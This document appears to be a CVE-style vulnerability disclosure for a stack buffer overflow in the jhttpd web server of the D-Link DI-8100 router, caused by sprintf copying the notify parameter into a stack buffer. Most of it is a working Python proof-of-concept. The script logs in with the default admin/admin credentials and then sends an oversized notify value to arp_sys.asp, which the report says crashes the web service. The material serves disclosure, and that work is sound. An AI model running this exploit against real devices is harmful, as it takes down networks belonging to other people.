# The D-Link DI-8100 contains a binary vulnerability

**Vulnerability Description**
DI-8100 is a wireless broadband router designed by D-Link for small and medium-sized network environments. A binary vulnerability exists in its `jhttpd` program, which can be exploited by attackers to cause a denial of service (DoS).
Firmware download link: [https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100](https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100)

**Code Audit**
In the `arp_sys_asp` function within the `jhttpd` binary, the `notify` parameter is controllable (the function `httpd_get_parm` is used to handle GET request parameters).

![](https://github.com/xubeining/Cve_report/blob/main/Dlink1.png)
It leads to a stack overflow because `sprintf` copies the data into `v16`, a stack buffer.

![](https://github.com/xubeining/Cve_report/blob/main/Dlink2.png)

**POC**
```
import requests

# 创建一个会话对象
session = requests.session()

# 请求登录的 URL 和头部信息
login_url = "http://192.168.0.1/login.cgi"
login_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.0.1",
    "Connection": "close",
    "Referer": "http://192.168.0.1/login.html",
    "Upgrade-Insecure-Requests": "1"
}
login_data = {
    "user": "admin",
    "password": "admin"
}

# POST 请求进行登录
login_response = session.post(login_url, headers=login_headers, data=login_data)

# 构造 payload 触发缓冲区溢出
payload = b'a' * 0x200
command_url = f"http://192.168.0.1/arp_sys.asp?notify={payload}"

# 构造执行命令的请求头
command_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# GET 请求触发漏洞
response = session.get(command_url, headers=command_headers)

# 打印返回内容
print(response.text)
```
**Verification**
![](https://github.com/xubeining/Cve_report/blob/main/Dlink3.png)
After sending the PoC, the web service crashes.
![](https://github.com/xubeining/Cve_report/blob/main/Dlink4.png)
